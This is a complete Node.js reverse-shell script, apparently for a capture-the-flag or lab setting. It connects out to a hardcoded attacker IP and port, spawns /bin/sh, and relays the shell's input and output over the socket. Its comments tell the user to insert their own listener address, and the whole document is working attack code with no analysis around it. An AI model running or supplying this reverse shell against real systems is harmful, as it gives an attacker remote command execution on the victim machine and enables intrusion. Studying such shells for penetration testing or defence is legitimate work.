const net = require("net");
const { spawn } = require("child_process");

const HOST = "10.10.14.14";  // Replace with your IP
const PORT = 4444; // Replace with your listening port

const client = new net.Socket();
client.connect(PORT, HOST, () => {
    const sh = spawn("/bin/sh", []);
    client.write("Connected!\n");

    client.on("data", (data) => {
        sh.stdin.write(data);
    });

    sh.stdout.on("data", (data) => {
        client.write(data);
    });

    sh.stderr.on("data", (data) => {
        client.write(data);
    });

    client.on("close", () => {
        process.exit(0);
    });
});

